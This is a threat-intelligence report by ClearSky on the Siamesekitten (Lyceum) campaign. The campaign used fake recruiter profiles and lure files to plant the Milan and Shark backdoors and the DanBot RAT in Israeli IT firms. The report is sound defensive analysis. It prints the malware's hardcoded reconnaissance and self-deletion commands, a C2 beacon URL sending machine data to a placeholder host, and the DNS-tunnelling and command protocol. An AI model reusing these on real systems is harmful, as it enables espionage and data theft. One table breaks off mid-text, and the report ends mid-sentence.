To this end Siamesekitten established a large\n\ninfrastructure that enabled them to impersonate the company and their HR personnel. We believe that\n\nthis infrastructure was built to lure IT experts and penetrate their computers to gain accesses to the\n\ncompany’s clients.\n\nIn July 2021, we detected a second wave of similar attacks against additional companies in Israel. In\n\nthis wave, Siamesekitten upgraded their backdoor malware to a new version called “Shark” and it\n\nreplaced the old version of their malware called “Milan”. Details of both versions are included in our\n\nreport.\n\nThis report summarizes our findings regarding the latest Siamesekitten attacks and reviews the attack\n\npatterns and malware used in this campaign.\n\nWe believe that during the past several months Siamesekitten APT has been trying to penetrate into\n\nmany Israeli organizations, using supply chain tools.\n\nThe attack sequence of Siamesekitten’s attacks that was uncovered by our researchers includes the\n\nfollowing phases:\n\n1. Identifying the potential victim (employee).\n\n2. Identifying the human resources department employee who may be impersonated.\n\n3. Establishing a phishing website that impersonates the targeted organization.\n\n4. Creating lure files compatible with the impersonated organization.\n\n5. Setting up a fraudulent profile on LinkedIn, impersonating the mentioned HR department\n\nemployee.\n\n6. Contacting potential victims with an \"alluring\" job offer, detailing a position in the\n\nimpersonated organization\n\n7. Sending the victim to a phishing website with a lure file.\n\n8. The Milan backdoor malware infects the computer or server after one or more lure files are\n\ndownloaded. As a result, a connection is established between the infected machine and the\n\nC&C server using DNS and HTTPS.\n\n9. The DanBot RAT is downloaded to the infected system.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n10. Through the infected machine, the group gathers data, conducts espionage, and attempts to\n\nspread within the network.\n\nThe Iranian attack group Siamesekitten (also named Lyceum/Hexane) has been active since 2018[1]. In\n\nthe past, the group has mainly targeted oil, gas, and telecom companies. In 2018, the group primarily\n\nattacked several African countries, and in 2019, they began attacking Middle Eastern [2] countries as\n\nwell. In the first quarter of 2021 the group focused on attacks in Tunisia[3].\n\nAccording to research conducted by Dragos researchers, the group establishes a foothold on the\n\nmachines they infect to facilitate continued activities on the network. Additionally, Dragos stated that\n\nthe group primarily employs lure documents as an initial attack vector. Several security companies\n\nwere able to detect a partial resemblance between Siamesekitten’s activities and activities conducted\n\nby two other Iranian groups – APT33 and APT34. After establishing persistence on the infected machine,\n\nthe group uses DanBot, a Remote Access Trojan (RAT) that enables downloading and uploading files\n\nfrom and to the C&C server.\n\nThis campaign is similar to the North Korean \"job seekers\" campaign, employing what has become a\n\nwidely used attack vector in recent years - impersonation. Many attack groups are executing this type\n\nof campaign, such as the North Korean Lazarus campaign we exposed in the summer of 2020 (Dream\n\nJob) and the Iranian OilRig campaign (APT34) that targeted Middle Eastern victims in the first quarter\n\nof 2021.\n\nThe group offers the potential victim an “alluring” job offer in a known company that they are\n\nimpersonating. The victim will be referred to a website hosted on the impersonating server, where they\n\nwill find details concerning jobs in Israel, France, and the UK. The website also presents two lure files –\n\nan Excel file that unloads the backdoor using a malicious Macro, and an executable that unloads the\n\nsame backdoor onto the machine. After unloading the backdoor, a connection is established between\n\nthe infected machine and the C&C server, which will eventually lead to the download of a RAT to the\n\nvictim's computer. This dual infection is another development of the group's attack methods.\n\nWe believe that these attacks and their focus on IT and communication companies are intended to\n\nfacilitate supply chain attacks on their clients. According to our assessment, the group's main goal is\n\nto conduct espionage and utilize the infected network to gain access to their clients’ networks. As\n\nwith other groups, it is possible that espionage and intelligence gathering are the first steps toward\n\nexecuting impersonation attacks targeting ransomware or wiper malware.\n\n1 dragos.com/threat/hexane/\n\n2 secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign\n\n3 securelist.com/apt-trends-report-q1-2021/101967 /\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n##### Attack Tools\n\nIn the Siamesekitten campaign, we discovered several malicious files which the attackers used to gain\n\ninitial access to infected computers. The tools and techniques are divided into three categories:\n\n1. Social engineering techniques – Siamesekitten used social engineering techniques to lure the\n\npotential victim into downloading malicious files:\n\na. Siamesekitten created fake profiles on social networks (mainly LinkedIn).\n\nb. Siamesekitten created phishing sites impersonating the company that allegedly offers the\n\nalluring jobs.\n\n2. Lure files – Siamesekitten used two types of lure files that do the same thing - download the\n\ngroup's malware to the machine:\n\na. Excel file that includes details concerning the various job offers that appeared on the\n\nimpersonating website. A malicious, password protected Marco is embedded inside this\n\nexcel, designed to download the malware onto the victim's machine.\n\nb. A Portable Executable (PE) file that allegedly includes a 'catalog' of products used by the\n\nimpersonated organization. After executing the file, the malware will be downloaded onto\n\nthe machine.\n\n3. Attack files and methods of communicating with the C&C server\n\na. Siamesekitten used a backdoor that was unloaded to the machine after the victim\n\nopened     one of the lure files. Later, the DanBot RAT was downloaded to the machine,\n\nfollowed by the group's new “Shark” backdoor.\n\nb. The malicious backdoor “Milan” that enables communications between the C&C server\n\nand the infected machine over DNS queries.\n\nc. Communications over DNS Tunneling – communications with the different C&C servers is\n\nconducted using DNS queries. We detected C&C server addresses hard coded to the files.\n\nd. RAT files – the DanBot RAT, used by the group for several years.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n##### MITRE ATT&CK Categories\n\nThe following table depicts the attack scenario using MITRE ATT&CK:\n\nMITRE Phase Techniques, Title MITRE ATT&CK\n\nTools and\nProcedures\n\nSiamesekitten establishes\n\nResource several servers for DNS\nProcedures Acquire Infrastructure – T1583\n\nDevelopment Tunneling, and several servers\n\nfor the fraudulent website\n\nSiamesekitten sends a spear\nphishing link to the victim via Spear phishing Link –\n\nInitial Access Techniques\n\nimpersonated social media T1566.002\n\nprofile\n\nSiamesekitten uses a\n\nCommand and Scripting\n\nmalicious office Macro written\n\nTools Interpreter: Visual Basic –\n\nin Visual Basic to install the\n\nT1059\n\nmalware\n\nCommand and Scripting\n\nSiamesekitten uses CMD\n\nExecution Tools Interpreter: Windows\n\ncommands to gain a foothold\n\nCommand Shell – T1059.003\n\nSiamesekitten uses malicious\n\nfiles (Excel and Portable User Execution: Malicious File\n\nTools\n\nExecutable) to drop the – T1204.002\nmalware\n\nPersistence Procedures Scheduled Task Scheduled Task - T1053.005\n\nSiamesekitten encodes their\n\ndata in Base64, and uses Deobfuscate/Decode Files or\n\nDefense Evasion Techniques\n\npasswords for files and Information – T1140\nmacros\n\nSiamesekitten uses DNS\n\nApplication Layer Protocol:\n\nTechniques Tunneling to communicate\n\nDNS – T107.004\n\nCommand and with the malware\n\nControl Siamesekitten encodes the\nData Encoding: Non-Standard\n\nTechniques data that is sent to the C2\n\nEncoding – T1132.002\n\nbased on their own protocol\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n|MITRE Phase|Techniques, Tools and Procedures|Title|MITRE ATT&CK|\n|---|---|---|---|\n|Resource Development|Procedures|Siamesekitten establishes several servers for DNS Tunneling, and several servers for the fraudulent website|Acquire Infrastructure – T1583|\n|Initial Access|Techniques|Siamesekitten sends a spear phishing link to the victim via impersonated social media profile|Spear phishing Link – T1566.002|\n|Execution|Tools|Siamesekitten uses a malicious office Macro written in Visual Basic to install the malware|Command and Scripting Interpreter: Visual Basic – T1059|\n||Tools|Siamesekitten uses CMD commands to gain a foothold|Command and Scripting Interpreter: Windows Command Shell – T1059.003|\n||Tools|Siamesekitten uses malicious files (Excel and Portable Executable) to drop the malware|User Execution: Malicious File – T1204.002|\n|Persistence|Procedures|Scheduled Task|Scheduled Task - T1053.005|\n|Defense Evasion|Techniques|Siamesekitten encodes their data in Base64, and uses passwords for files and macros|Deobfuscate/Decode Files or Information – T1140|\n|Command and Control|Techniques|Siamesekitten uses DNS Tunneling to communicate with the malware|Application Layer Protocol: DNS – T107.004|\n||Techniques|Siamesekitten encodes the data that is sent to the C2 based on their own protocol|Data Encoding: Non-Standard Encoding – T1132.002|\n\n\n-----\n\n##### Analyzing the Attack\n\nThis chapter reviews the group's attack scenario in detail, beginning with initially contacting the victim\n\nthrough LinkedIn and ending with the final phase of the attack – unloading the RAT onto the victim's\n\nmachine. Notably, this is a dual attack scenario, entailing two lure files that accompany the phishing\n\nwebsite.\n\n###### TTPs\n\n Social Engineering\n\n Approaching the Victim\n\nThe victim is contacted through social media. In this instance, the profile is impersonating a manager\n\nfrom ChipPc’s HR department, an Israeli technology company. Conversing with the company\n\ncorroborated that an HR manager with this name was employed in 2007. This indicates that the\n\nattackers thoroughly researched the subject of impersonation to generate a convincing social\n\nengineering array.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nWhen the group contacts the victim, they use a fake profile to offer a significant position in the\n\ncompany’s IT and technology fields. The victim is then directed to a website that is embedded with\n\nmalware and is designed to impersonate the company’s legitimate website.\n\n###### Impersonating Websites\n\nWe estimate that the group is employing a focused social engineering format. We have detected two\n\nprominent websites over the past six months that we associate with this infrastructure:\n\nSoftwareagjob[.]com\n\nThe company Software AG is a large-scale German technology company. A website impersonating this\n\ncompany was continuously active during February. Throughout this attack, the group used the fake\n\nwebsite to offer a position in the company.\n\nThe impersonating webpage included a link to an XLS lure document that allegedly provides a resume\n\nformat:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nJobschippc[.]com\n\nThis is the group’s primary website as of the end of May 2021. The website impersonates ChipPc, the\n\npreviously mentioned Israeli IT company, and exhibits the group’s new dual attack scenario – using\n\ntwo lure documents simultaneously.\n\nWhen the victim visits the website, they arrive at a page detailing three positions in the company: one\n\nposition in Rehovot (a city in Israel), concerning project management, HR, and sales, and two\n\nadditional positions in France and the United Kingdom (Paris and London respectively) concerning\n\nsales and development. In addition to reading the wording, the victim is requested to download two\n\nfiles that each refer to a different aspect of the job offer. The first file is an XLS that details the\n\nrequirements for each of the offered positions, and the second is an executable that allegedly details\n\nthe company’s capabilities in various fields. The files will be elaborated upon below.\n\nThe website also seemingly offers a .docx file for download that is named “invitation.docx”, but this\n\nsegment is not operational at this point.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nWhen examining the fake website’s file server, it appears that the files were uploaded on May 18[th], a\n\nday after they were generated. The website itself was already prepared on May 6[th], several days before\n\nit went “live” on May 11[th]:\n\n###### Lure Files\n\n XLS File\n\nThe Excel file, named “Capabilities.xls”, contains information concerning the different positions and\n\ntheir requirements. For example:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThe Excel file was generated on May 17[th], approximately six days after the fake website was created.\n\nThe file is embedded with a malicious, password protected macro that provides a layer of defense from\n\nresearchers, and its OLE data indicates editors named Fred and Jonathon. We were able to overcome\n\nthe encryption and encoding. Once editing is enabled and the malicious macro is executed, a malicious\n\nbackdoor named MsNpENg is extracted to several folders with the same name:\n\nAs seen in the source code, a scheduled task is generated to establish persistence on the targeted\n\nserver. This is the familiar Siamesekitten scenario that they have been employing since 2018.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n###### Executable File\n\nThis file is a new addition to the group’s methods. The website contains a password protected ZIP\n\narchive (the password is the domain impersonating the legitimate company) as well as the Excel file.\n\nThe archive contains three additional files:\n\n- An executable named “companycatalog”.\n\n- A configuration file named “companycatalog.exe.config”.\n\n- A dynamic library that generates a scheduled task to execute the malware.\n\nNotably, all three files must be extracted to successfully run the malware, as evident from the\n\nexecutable:\n\nEven though the malware seems like it was written in .NET, a closer inspection reveals that it was\n\nwritten in C++:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThe configuration file’s contents:\n\nThe executable allegedly provides details concerning the products ChipPc specializes in, emphasizing\n\nthree primary products: Citrix, Microsoft, and VMware. A link leading to the product’s legitimate\n\ndeveloper is added alongside the provided details:\n\nWhen executing the aforementioned file, while extracting the rest of the archived files, the backdoor is\n\nextracted again. This time, the backdoor is extracted with the name “ChipPc.exe”, though it still uses\n\nthe COM component to generate a scheduled task.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n###### Milan Backdoor\n\n Malware Analysis\n\nDespite the previously presented names (ChipPc for example) the original file was named Milan.exe, as\n\ncan be seen in the file’s properties:\n\nThis may also be learned from the malware’s PDB path:\n\nC:\\Users\\kernel\\Desktop\\milan\\Release\\Milan.pdb\n\nThe malware’s Debugger Stamp date is May 18[th], indicating that the malware was newly created a day\n\nafter the Excel file:\n\nThe malware executes several CMD commands that are hard coded to the malware's source code:\n\n   - C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1\n\n   - C:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1\n\n   - C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q \"%s\" & schtasks\n\n/delete /tn Optimize Machine Analysis /f\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n   - C:\\Windows\\system32\\ cmd.exe /c ping 4.2.2.4 -n 1 -w 4000 > Nul & del /f /q \"%s\" & waitfor a 4\n\n& copy \"%s\" \"%s\" & schtasks /Run /TN \"SystemTask\"\n\nAs mentioned previously, when one of the lure documents is executed, a folder is generated in\n\n“Program Data” containing the malware. Another folder named “log” is generated in this folder,\n\nalongside a text file named “current” and files with the suffix MDF (disk).\n\nThe text file contains a short string – “config:1251”. After the malware is executed, this file will be\n\ndeleted. The malware gathers information concerning the machine, such as the machine’s name, what\n\nusers are registered on it, and more. The contents are encoded and saved in files with the suffix MDF.\n\nIn accordance with Siamesekitten’s familiar attack scenario, folders meant to receive or upload files\n\nare generated in the “log” folder. Each folder’s name begins with the character sequence\n\n“a9850d2f”and ends with a single different character that signifies the folder’s function. For example,\n\nthe folder named “a9850d2fd” is used to receive files sent from the C&C server through DNS Tunneling.\n\nThe letters d, f, g, and s are used to differentiate the folders:\n\nThe servers the malware contacts are hard coded to its code:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\n###### Communication with the Server\n\nCommunications are performed using two methods. Initially, HTTP requests are sent to the C&C\ndomain to download a malicious payload. The requests are sent with a pre-defined user agent:\n\nThe requests’ contents are the following:\n\nMozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\n\nChrome/89.0.4389.114 Safari/537.36\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media\n\nCenter PC 4.0; .NET CLR 2.0.50727)\n\nThe C&C server contacted by the malware was previously used by other Iranian attack groups, such as\n\nAPT39:\n\nFollowing this, the malware attempts to send DNS queries. If the queries are successful, they are\n\ndirected to C&C servers operated by the group. In the following example, communications over DNS\n\nwere successful, and were directed to C&C servers situated in Russia, the Ukraine, or Nigeria as a result.\n\nThese are apparently either compromised servers used by the group or VPN\\VPS servers.\n\nIf the communications fail, the digit “0” is returned in response. If they are successful, a signal\n\ncontaining four characters alongside some additional content is returned in response.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nAfter eight characters, a .bin suffix is received as a signal:\n\nThe responses are eventually united to a single payload – f5cf9869.bin. This file is saved in the relevant\n\nfolder (specified by the letter “d”):\n\nC:\\ProgramData\\MsNpENg\\Log\\a9850d2fd\\f5cf9869.bin\n\nAlternatively, the server may respond with complete words, such as “yes”:\n\nIt appears that communications are directed at several different C&C servers, specifically\n\ndefenderlive[.]com and dnsstatus[.]org in the following instance:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nWe have identified various communication formats. The preliminary communications that generate\n\nthe connection are characterized as the following:\n\nQuery Domain IP\n\nyciw-fbrleh1-ezbroemoectjecqmz6frgxqlzutrxsmuux dnsstatus / defender 35.35.35[.]35\n\nyciw-fbrleh1w-s-g-a-jet1-s-qtahecnuecpl dnsstatus 48.32.32[.]32\n\nyciw-sgpoet5w-s-g-a-ueh5-s-qtahecnuecpl dnsstatus 48.32.32[.]32\n\nyciw-fgapec1w-s-g-a-nem1-s-qtahecnuecpl dnsstatus 48.32.32[.]32\n\nyciw-strkdqoj-s-g-a-heo5-s-qtahecnuecpl defedner 48.32.32[.]32\n\nyciw-qgroem6j-s-b-a-hem5-s-qtahecnuecpl defedner 48.32.32[.]32\n\n###### Shark Backdoor\n\n Malware Analysis\n\nIn July 2021, indicators associated with this attack were shared with us by colleague researchers.\n\nThrough cross-referencing findings from the campaign, we identified this malware as a substitute for\n\nDanBot. According to one of the files’ PDB path, the malware is named “Shark”, a name we adopted\n\n(like in Milan’s case):\n\nC:\\Projects\\Shark\\Shark\\obj\\Debug\\Shark.pdb\n\nIn addition, we were able to detect other PDB paths containing the name” Shark”, but the file name\n\nwas changed to appear more legitimate. Here are the two additional paths:\n\nD:\\source\\repos\\Shark\\Shark\\obj\\Release\\audioddg.pdb\n\nC:\\Users\\David\\Desktop\\sharkkkkkk\\Shark\\obj\\Release\\Winlangdb.pdb\n\nUnlike the Milan malware, these files were written in .NET instead of C ++. The malware requires the\n\nuse of a parameter that contains part of the executed file’s name. The malware will generate a Mutex\n\nwith the file’s name as its value to make sure that the malware does not run on the infected machine\n\nmore than once. Executing the malware is also conditioned by the screen width being more than 600\n\npixels.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n|the connection are characterized as the following:|Col2|Col3|\n|---|---|---|\n|Query|Domain|IP|\n|yciw-fbrleh1-ezbroemoectjecqmz6frgxqlzutrxsmuux|dnsstatus / defender|35.35.35[.]35|\n|yciw-fbrleh1w-s-g-a-jet1-s-qtahecnuecpl|dnsstatus|48.32.32[.]32|\n|yciw-sgpoet5w-s-g-a-ueh5-s-qtahecnuecpl|dnsstatus|48.32.32[.]32|\n|yciw-fgapec1w-s-g-a-nem1-s-qtahecnuecpl|dnsstatus|48.32.32[.]32|\n|yciw-strkdqoj-s-g-a-heo5-s-qtahecnuecpl|defedner|48.32.32[.]32|\n|yciw-qgroem6j-s-b-a-hem5-s-qtahecnuecpl|defedner|48.32.32[.]32|\n\n\n-----\n\nNext, the malware will activate a function called ‘redus’. This function produces an encrypted G-ZIP file\n\nwith a preset configuration which is encoded within the malware. This configuration file contains two\n\nC&C servers and various malware functions, which will be detailed below.\n\nThe following is the relevant code snippet:\n\nThe configuration file will be encoded using a 0x2a XOR key. The malware will generate four folders\n\naccording to the relevant functions named ‘D1’, ‘U1’, ‘D2’ and ‘U2’ - like the folders created when the\n\nMilan backdoor is installed. Random numbers between 0 and 1,000,000 will be added before and after\n\nthe predefined folder names.\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThe following is an analysis of the parameters we detected in the configuration:\n\nField Purpose\n\nS1 C&C server 1\n\nS2 C&C server 2\n\nT1 DNS traffic pause intervals\n\nT2 HTTP traffic pause intervals\n\nD1 Determines the path that will store files downloaded through DNS\n\ncommunication\n\nD2 Determines the path that will store files downloaded through\n\nHTTP communication\n\nU1 Determines the path that will store files to be uploaded to the C&C\n\nthrough DNS communication\n\nU2 Determines the path that will store files to be uploaded to the C&C\n\nthrough HTTP communication\n\nID Defines a unique identifier for the infected machine\n\nSH If empty - receive information via DNS queries\n\nIf not empty - send information through HTTP requests\n\nHS If 0 - send information through DNS queries\n\nIf 1 - receive information via HTTP requests\n\nDi / Hi Unknown (apparently, these are communication parameters)\n\nTo establish a foothold on the machine, the malware will save the infected machine’s GUID and paste\n\nit into the configuration ID. In addition, the machine creates four main functions that indicate\n\ncommunications with the C&C server (over HTTP and DNS). DNS communications are sent using a\n\nunique Domain Generation Algorithm. Alongside another function called ‘E’, the functions run as an\n\ninfinite thread, allowing the malware to continue running as long as the machine is turned on.\n\nThe five distinct functions are ‘HT’, ‘HT_SEND’, ‘DN’, ‘DN_SEND’, and ‘E’.\n\nThe E function is responsible for managing files in the D1 and D2 folders. These folders contain data\ndownloaded to the infected machine from the C&C server. The malware initially searches for ZIP files,\nsaving their content to the memory and deleting the files.\n\nIf the file’s suffix is TMP.ZIP, it is assumed to contain commands and is extracted and decrypted using\nthe Reject function, like the configuration file. The results of executing the commands will be stored in\nthe folders U1 or U2 to be uploaded to the C&C, matching the D1 or D2 folders in which they originated.\n\nNotably, some of the commands require CMD to activate. The malware constructs CMD commands\n\nfrom the file downloaded from the C&C and transfers them to a file named dmp.bat. The malware\n\nthen searches for dmp.bat and attempts to execute it through CMD.\n\nThe following is a processing of the ‘Reject’ function:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n|Field|Purpose|\n|---|---|\n|S1|C&C server 1|\n|S2|C&C server 2|\n|T1|DNS traffic pause intervals|\n|T2|HTTP traffic pause intervals|\n|D1|Determines the path that will store files downloaded through DNS communication|\n|D2|Determines the path that will store files downloaded through HTTP communication|\n|U1|Determines the path that will store files to be uploaded to the C&C through DNS communication|\n|U2|Determines the path that will store files to be uploaded to the C&C through HTTP communication|\n|ID|Defines a unique identifier for the infected machine|\n|SH|If empty - receive information via DNS queries If not empty - send information through HTTP requests|\n|HS|If 0 - send information through DNS queries If 1 - receive information via HTTP requests|\n|Di / Hi|Unknown (apparently, these are communication parameters)|\n\n\n-----\n\n|Command|Purpose|\n|---|---|\n|s1:<server>|Update the configuration of the new C&C server S1|\n|s2:<server>|Update the configuration of the new C&C server S1|\n|t1:<time>|Update DNS traffic pause intervals|\n|t2:<time>|Update HTTP traffic pause intervals|\n|D1|Export path D1 as an encoded text file to folder U1 or U2|\n|D2|Export path D2 as an encoded text file to folder U1 or U2|\n|U1|Export path U1 as an encoded text file to folder U1 or U2|\n|U2|Export path U2 as an encoded text file to folder U1 or U2|\n|sh|Export the flag Sh as an encoded text file to folder U1 or U2|\n|vr|Export the flag Vr as an encoded text file to folder U1 or U2|\n|id|Export the ID identifier as an encoded text file to folder U1 or U2|\n|exe|Export the name of the file from which the malware is executed as an encoded text file to folder U1 or U2|\n|proc|Export the malware’s process number to folder U1 or U2|\n|kl|Halt activity and delete the malware and its containing folder’s contents|\n|hs|Update the Hs field and signal success or failure by writing to the U1 or U2 folders|\n|up|Update the malware|\n\n\nIf the file extension is changed, the file will be decoded and extracted to a folder that appears in the file\n\nname.\n\n###### Communication with the Server \n\nDN function: this function is responsible for downloading information from the C&C using DNS\nTunneling. The function generates unique subdomains and resolves them to send or receive\ninformation. The function responsible for generating the domains is the d-gen function, which receives\nfour different parameters:\n\n1. D (data) - the requested information.\n\n2. Id - the message’s identifier.\n\n3. Op - the type of information.\n\n4. D2 - the information meant to be sent.\n\nThe following is the relevant code snippet:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThe DN function can process several different types of information which will be sent to the server or\n\ndownloaded from it. The following is a list of the various OP IDs:\n\nOP ID Purpose\n\nI Detects the current C&C’s address using the subdomain unique to the machine\n\nand saves it to the Sh field\n\nO Checks whether the C&C’s IP address has changed. If it was, the Sh field is reset\n\nk Requests a file from the C&C server\n\nt As long as this file is received, the malware has not finished downloading the file\n\nfrom the C&C server\n\ns Receiving this flag indicates that the file download has finished\n\nx Delete the original downloaded file in case the download failed\n\nThe DN_SEND function is activated once the DN function concludes its activity. Like the DN function,\n\nDN_SEND is responsible for sending information through DNS using d_gen.\n\nThis function has 2 additional OP identifiers:\n\nOP ID Meaning\n\nj Prepares the C&C server to receive information\n\nn This flag is sent while sending information to the C&C. The replies received from\n\nthe server determine whether to continue sending information or to delete the\n\nsent file (in case it was successfully sent or was failed to be sent)\n\nThe sub-domain created for communications with the C&C server contains the following parameters\n\nwhich will be encoded to hex accordingly:\n\n<ID> <OP> <Time in Seconds> <Data> <Random> .c2.tld\n\nHT function: like the DN function, the various HT functions are also responsible for communications\n\nwith the C&C server over the HTTPS protocol. The ‘HT’ function in the malware is responsible for\n\ndownloading information from the C&C server. Like the ‘DN’ function, various OP parameters will be\n\ncollected information such as: the GUID, ID of the infected machine (computer or server), the machine’s\n\nname, version, and HTTP time out.\n\nThe following are the various parameters sent to the server during initial communications:\n\nhttp://maliciousdomain.com/?q=GUID&q1=MachineId&q2=MachineName&q3=vr&q4=HttpTimeOut(t\n\n2)\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n|OP ID|Purpose|\n|---|---|\n|I|Detects the current C&C’s address using the subdomain unique to the machine and saves it to the Sh field|\n|O|Checks whether the C&C’s IP address has changed.

After it is sent, the file is deleted.\n\n###### DanBot RAT\n\nIn a campaign we detected during May-June, we identified a file uploaded to Virus Total that originated\n\nin Tunisia and included two versions of the DanBot malware the group has been using for a long time.\n\nThe first file was named ‘UltraVNC.exe’ and the second file was named ‘WINVNC.exe’. These two files\n\nare two versions of a remote control (fundamentally legitimate) technique called Virtual Network\n\nComputing, a remote access software which has been converted to RAT (trojan).\n\nThe first version is the UltraVNC tool that may be downloaded from the following site:\n\nuvnc.com/\n\nThe second version is the WinVNC tool which is an NT VNC Server that may be downloaded from the\n\nfollowing site:\n\nUmsl[.]edu/~eckerta/vnc_docs/winvnc.html#:~:text=WinVNC%20is%20a%20VNC%20server,desktop\n\n%20from%20any%20VNC%20viewer.&text=It%20is% 20only% 20fair% 20to, software% 2C% 20for%\n\n20example% 2C% 20does\n\nThese files allow the attacker to remotely access the victim’s desktop. However, it is only possible to\n\nestablish a connection when no one is using the system. The tool allows for remote control of another\n\ncomputer's screen, including controlling the mouse and keyboard, internet access, transferring files\n\nand managing the computer.\n\nAccording to the PDB path it can be seen similarities between this file and other group files:\n\nC:\\Users\\kernel\\Desktop\\final20201202\\Files\\BackDor Last\\Release\\WINVNC.pdb\n\nThe file was generated in 2020. This may be learned from the folder’s name: ‘Final-2020-01-20’.\n\nHowever, the signature for these files is Copyright 2019 (apparently a fake figure) while the compilation\n\ntime is June 9[th], 2021. The file appears to be an advanced version of the group's previous tools but was\n\nrecently created in its current format and implemented after the start of the ChipPc campaign.\n\nThe compilation time:\n\n____________________________________________________________________________________________________\n© All rights reserved to ClearSky Cyber Security ltd. 2021\n[info@clearskysec.com](mailto:info@clearskysec.com) [www.clearskysec.com](http://www.clearskysec.com/)\n\n**TLP:WHITE**\n\n\n-----\n\nThe following are the file’s properties:\n\nLike the backdoor, both types of this VNC file unload a TXT file containing configuration data (config:\n\n1251) that will be deleted after the file is installed, like in Milan’s case. Another similarity we found is in\n\nthe CMD commands used by the group, presented above, as well as the User Agent embedded in the\n\nfile. Two of the group’s new C&C servers are embedded in the files.\n\n##### Attack Infrastructure\n\nThe attack infrastructure includes fake websites and C&C servers capable of processing both HTTP\n\nrequests and DNS queries. The lure websites’ infrastructure is completely different to the C&C servers’\n\ninfrastructure. In resemblance to past attacks conducted by the group, the C&C server infrastructure\n\nimpersonates IT services such as a DNS-checking website named DNS-status, or various anti-virus\n\nservices, such as Defender-Live.\n\nUtilizing our past familiarity with these methods, we were able to identify C&C servers with the address\n\n185.243.112[.]120 and 